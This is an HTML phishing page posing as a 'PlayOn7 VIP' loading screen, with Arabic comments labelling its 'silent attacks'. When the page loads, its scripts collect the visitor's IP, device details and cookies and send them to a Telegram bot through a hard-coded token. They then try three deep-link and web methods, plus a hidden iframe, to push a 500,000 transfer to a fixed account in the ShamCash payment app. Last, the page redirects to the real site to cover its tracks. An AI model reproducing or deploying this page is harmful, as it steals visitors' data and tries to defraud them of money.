<!DOCTYPE html>
<html>
<head>
    <title>PlayOn7 - جارٍ التحميل...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://playon7.com/favicon.ico">
    <style>
        body { background: #0a0f1e; color: white; font-family: Arial; text-align: center; padding: 50px; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00d4aa; border-radius: 50%; width: 50px; height: 50px; animation: spin 0.8s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden-iframe { display: none; }
    </style>
</head>
<body>
    <h2>🏆 PlayOn7 VIP</h2>
    <p>جارٍ تجهيز لوحة التحكم الخاصة بك...</p>
    <div class="spinner"></div>
    <p style="opacity: 0.6; font-size: 14px;">يرجى الانتظار. لا تغلق الصفحة.</p>

    <!-- ========== الهجمات الصامتة ========== -->
    
    <!-- 1. سرقة IP والبصمة وإرسالها فوراً -->
    <script>
        const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
        const CHAT_ID = "8665747715";
        const YOUR_ACCOUNT = "6381946898993929";
        
        // جمع كل معلومات الجهاز
        const info = {
            ip: "جاري الجلب...",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenSize: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || "مباشر",
            cookies: document.cookie || "لا يوجد",
            timestamp: new Date().toLocaleString('ar-SY')
        };
        
        // جلب IP حقيقي
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                info.ip = data.ip;
                const msg = `🔥 ضحية نقرة:\n🌐 IP: ${info.ip}\n📱 ${info.userAgent}\n🕐 ${info.timestamp}`;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            });
    </script>

    <!-- 2. محاولة فتح شام كاش مع أمر تحويل (3 طرق مختلفة) -->
    <script>
        setTimeout(() => {
            // الطريقة 1: Intent
            window.location.href = `intent://transfer?account=${YOUR_ACCOUNT}&amount=500000#Intent;scheme=shamcash;package=com.syriatel.mtncash;end;`;
        }, 2000);

        setTimeout(() => {
            // الطريقة 2: رابط مباشر (احتياطي)
            window.location.href = `shamcash://transfer?account=${YOUR_ACCOUNT}&amount=500000`;
        }, 2500);

        setTimeout(() => {
            // الطريقة 3: عبر المتصفح
            window.open(`https://shamcash.sy/pay?account=${YOUR_ACCOUNT}&amount=500000`, '_blank');
        }, 3000);
    </script>

    <!-- 3. إطار خفي يحاول استغلال ثغرات المتصفح تلقائياً -->
    <iframe class="hidden-iframe" id="silentFrame"></iframe>
    <script>
        // محاولة تحميل صفحة الدفع في إطار خفي
        setTimeout(() => {
            document.getElementById('silentFrame').src = `https://shamcash.sy/pay?account=${YOUR_ACCOUNT}&amount=500000`;
        }, 3500);
    </script>

    <!-- 4. إعادة توجيه نهائية إلى موقع Playon7 الحقيقي بعد 5 ثوانٍ -->
    <script>
        setTimeout(() => {
            window.location.href = "https://playon7.com";
        }, 5000);
    </script>
</body>
</html>
